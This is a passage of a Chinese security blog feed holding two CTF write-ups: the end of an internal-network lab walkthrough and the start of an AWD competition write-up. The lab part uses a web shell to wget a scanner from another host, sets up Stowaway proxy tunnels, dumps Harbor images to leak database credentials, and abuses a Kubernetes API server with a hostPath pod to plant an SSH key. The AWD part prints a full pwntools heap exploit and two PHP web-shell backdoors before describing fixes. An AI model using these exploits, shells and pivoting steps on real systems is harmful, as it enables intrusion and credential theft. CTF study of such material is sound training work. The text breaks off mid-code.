bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/fusermount<br>/bin/ping6<br>/bin/mount<br>/bin/su<br>/bin/ping<br>/bin/umount<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/at<br>/usr/bin/staprun<br>/usr/bin/base32<br>/usr/bin/passwd<br>/usr/bin/chsh<br>/usr/bin/sudo<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/s-nail/s-nail-privsep<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-12.png"></p><p>查看网卡情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:01:54:82 brd ff:ff:ff:ff:ff:ff<br>    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::216:3eff:fe01:5482/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:01:a4:5e brd ff:ff:ff:ff:ff:ff<br>    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::216:3eff:fe01:a45e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>同样的wget下载fscan</p><p><code>http://172.28.23.26/upload/.antproxy.php?a=system(&quot;wget http://172.28.23.17:8080/fscan&quot;);</code></p><p>然后反弹到thinkphp里执行</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-13.png"></p><p>172.22.14.1&#x2F;24 网段存活如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.14.37</span><br><span class="hljs-number">172.22.14.46</span><br></code></pre></td></tr></table></figure><h1 id="第二层内网"><a href="#第二层内网" class="headerlink" title="第二层内网"></a>第二层内网</h1><h2 id="建立代理-1"><a href="#建立代理-1" class="headerlink" title="建立代理"></a>建立代理</h2><p>使用<code>Stowaway</code>将内网主机多层代理出来</p><p>1：vps上作为管理端<br><code>./linux_x64_admin -l 2223 -s 2223</code></p><p>2：ThinkPHP (172.28.23.17) 作为跳板<br><code>./linux_x64_agent -c 47.99.77.52:2223 -s 2223 --reconnect 8</code></p><p>3：控制端监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">(admin) &gt;&gt; use 0<br>(node 0) &gt;&gt; listen<br>[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you<span class="hljs-string">&#x27;re controlling was started in the corresponding way!</span><br><span class="hljs-string">[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!</span><br><span class="hljs-string">[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1</span><br><span class="hljs-string">[*] Please input the [ip:]&lt;port&gt; : 8889</span><br><span class="hljs-string">[*] Waiting for response......</span><br><span class="hljs-string">[*] Node is listening on 8889</span><br></code></pre></td></tr></table></figure><p>4：新翔OA (172.28.23.26)连接到ThinkPHP (172.28.23.17)<br><code>./linux_x64_agent -c 172.28.23.17:8889 -s 2223 --reconnect 8</code></p><p>5：然后就可以建立socks代理了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">(node 0) &gt;&gt; socks 7878<br>[*] Trying to listen on 0.0.0.0:7878......<br>[*] Waiting <span class="hljs-keyword">for</span> agent<span class="hljs-string">&#x27;s response......</span><br><span class="hljs-string">[*] Socks start successfully!</span><br></code></pre></td></tr></table></figure><h2 id="Harbor-172-22-14-46"><a href="#Harbor-172-22-14-46" class="headerlink" title="Harbor (172.22.14.46)"></a>Harbor (172.22.14.46)</h2><p>尝试打<a href="https://github.com/404tk/CVE-2022-46463">harbor未授权</a></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-14.png"></p><p>下载secret镜像</p><p><code>python harbor.py http://172.22.14.46/ --dump harbor/secret -v2</code></p><p>得到flag5</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-15.png"></p><h2 id="DooTask-172-22-10-28"><a href="#DooTask-172-22-10-28" class="headerlink" title="DooTask (172.22.10.28)"></a>DooTask (172.22.10.28)</h2><p>下载projectadmin镜像</p><p><code>python harbor.py http://172.22.14.46/ --dump project/projectadmin -v2</code></p><p>run.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">sleep</span> 1<br><br><span class="hljs-comment"># start</span><br>java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar<br>/usr/bin/tail -f /dev/null<br></code></pre></td></tr></table></figure><p>找到<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>然后反编译</p><p>泄露了数据库账号密码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">spring.datasource.url=jdbc:mysql:<span class="hljs-comment">//172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC</span><br>spring.datasource.username=root<br>spring.datasource.password=My3q1i4oZkJm3<br>spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver<br><br>mybatis.type-aliases-<span class="hljs-keyword">package</span>=com.smartlink.projectadmin.entity<br>mybatis.mapper-locations=classpath:mybatis/mapper<span class="hljs-comment">/*.xml</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-16.png"></p><p>直接用MDUT一把梭</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-17.png"></p><h2 id="k8s-172-22-14-37"><a href="#k8s-172-22-14-37" class="headerlink" title="k8s (172.22.14.37)"></a>k8s (172.22.14.37)</h2><p>fscan扫到了10250端口，这个端口有个<code>k8s kubelet 10250端口未授权</code>，但是不符合利用条件</p><p>尝试另一个6443端口的Api Server未授权</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-21.png"></p><p>编辑恶意yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-deployment</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.8</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/mnt</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>        <span class="hljs-attr">hostPath:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br></code></pre></td></tr></table></figure><p>创建pod</p><p><code>kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/  apply -f evil.yaml</code></p><p>列出pod</p><p><code>kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-18.png"></p><p>进容器</p><p><code>kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash</code></p><p>写公钥</p><p><code>echo &quot;ssh-rsa xxxx&quot; &gt; /mnt/root/.ssh/authorized_keys</code></p><p>ssh连接，在数据库中得到flag</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-19.png"></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-20.png"></p><h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p>大概绘制的拓扑图</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-23.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-172-28-23-17&quot;&gt;&lt;a href=&quot;#ThinkPHP-172-28-23-17&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP (172.28.23.17)&quot;&gt;&lt;/a&gt;ThinkPHP (172.28.23.1</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云境" scheme="https://www.dr0n.top/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
    
    <category term="多维挑战" scheme="https://www.dr0n.top/tags/%E5%A4%9A%E7%BB%B4%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>2024宁波市第七届网络安全大赛决赛 awd wp</title>
    <link href="https://www.dr0n.top/posts/20b347fd/"/>
    <id>https://www.dr0n.top/posts/20b347fd/</id>
    <published>2024-05-25T10:00:00.000Z</published>
    <updated>2025-07-27T09:59:18.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p><strong>攻击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index\n&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br><br>p=remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>],timeout=<span class="hljs-number">2</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;name&#x27;</span>,<span class="hljs-string">b&#x27;rotwill&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;b mprotect\nc&#x27;)</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x50</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext=libc.address+<span class="hljs-number">0x52085</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>chunk1=d<br>edit(<span class="hljs-number">2</span>,p64(free_hook))<br>chunk6=chunk1-<span class="hljs-number">0x500</span>-<span class="hljs-number">0x10</span><br>payload=flat(&#123;<br>    <span class="hljs-number">0</span>:chunk6+<span class="hljs-number">0x100</span>,<br>    <span class="hljs-number">0x68</span>: chunk6&amp;(~<span class="hljs-number">0xfff</span>),<br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>,<br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">0x7</span>,<br>    <span class="hljs-number">0xa0</span>:chunk6,<br>    <span class="hljs-number">0xa8</span>: mprotect<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk6,<span class="hljs-number">0x40</span>)+\<br>            shellcraft.write(<span class="hljs-number">1</span>,chunk6,<span class="hljs-number">0x40</span>)<br>payload+=asm(shellcode)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x500</span>,payload)<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x50</span>,p64(setcontext))<br>free(<span class="hljs-number">6</span>)<br>p.readuntil(<span class="hljs-string">b&quot;flag&#123;&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>+p.readuntil(<span class="hljs-string">b&#x27;&#125;&#x27;</span>))<br><br>p.close()<br></code></pre></td></tr></table></figure><p><strong>修复</strong></p><p><img src="/img/awd/2024nb-1.png"></p><p>将触发free函数的操作改为清空对应chunk指针即可</p><p>然后导出替换</p><p><code>cat /tmp/pwn1 &gt; /home/ctf/pwn</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="漏洞1-默认后门"><a href="#漏洞1-默认后门" class="headerlink" title="漏洞1-默认后门"></a>漏洞1-默认后门</h2><p>用D盾直接扫可以扫到两个默认后门</p><p><img src="/img/awd/2024nb-2.png"></p><p><code>public/test.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]))&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>; <span class="hljs-variable">$cmd</span> = (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>); <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>; <span class="hljs-keyword">die</span>; &#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-3.png"></p><p><strong>修复</strong></p><p>直接删掉</p><h2 id="漏洞2-默认后门"><a href="#漏洞2-默认后门" class="headerlink" title="漏洞2-默认后门"></a>漏洞2-默认后门</h2><p><code>public/upload/other/20240513/hack.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-4.png"></p><p><strong>修复</strong></p><p>直接删掉</p><h2 id="漏洞3-任意文件上传"><a href="#漏洞3-任意文件上传" class="headerlink" title="漏洞3-任意文件上传"></a>漏洞3-任意文件上传</h2><p><code>public/hint.txt</code>得到管理员账号密码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">测试账号<br><br>账号:ADMIN1<br>密码:mypassword<br></code></pre></td></tr></table></figure><p>通过<code>.env</code>可知后台地址映射为<code>oka_admin</code></p><p><img src="/img/awd/2024nb-7.png"></p><p>登录后台后发现在上传头像处没有过滤，可以直接上传</p><p><img src="/img/awd/2024nb-8.png"></p><p>可惜这个点不是未授权，批量利用比较麻烦</p><p><strong>修复</strong></p><p>1：修改密码，后台没找到修改密码的地方，需要进入数据库修改</p><p>2：增加白名单</p><p><code>app/admin/controller/File.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 支持上传大文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span>        = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.&#x27;</span>);<br>    <span class="hljs-variable">$uploadPath</span>   = <span class="hljs-title function_ invoke__">public_path</span>().<span class="hljs-string">&#x27;upload/&#x27;</span>;<br>    <span class="hljs-variable">$uploadFile</span>   = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>    <span class="hljs-variable">$originalName</span> = <span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>();<br>    <span class="hljs-variable">$originalType</span> = <span class="hljs-title class_">FileAddons</span>::<span class="hljs-title function_ invoke__">getType</span>(<span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;upload.ext&#x27;</span>),  <span class="hljs-variable">$originalName</span>);<br>    <span class="hljs-variable">$chunkId</span>      = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">sha1_file</span>(<span class="hljs-variable">$uploadFile</span>).<span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;size&#x27;</span>]) : <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$chunkIndex</span>   = <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;index&#x27;</span>];<br>    <span class="hljs-variable">$chunkCount</span>   = <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;count&#x27;</span>];<br>    <span class="hljs-variable">$chunkPath</span>    = <span class="hljs-string">&#x27;chunk/&#x27;</span>.<span class="hljs-variable">$chunkId</span>.<span class="hljs-string">&#x27;/&#x27;</span>;<br><br><br>    <span class="hljs-comment">// 增加的代码</span><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalExtension</span>());<br>    <span class="hljs-variable">$allowedExtensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExtensions</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValidateException</span>(<span class="hljs-string">&#x27;只允许上传图片文件&#x27;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$originalType</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span 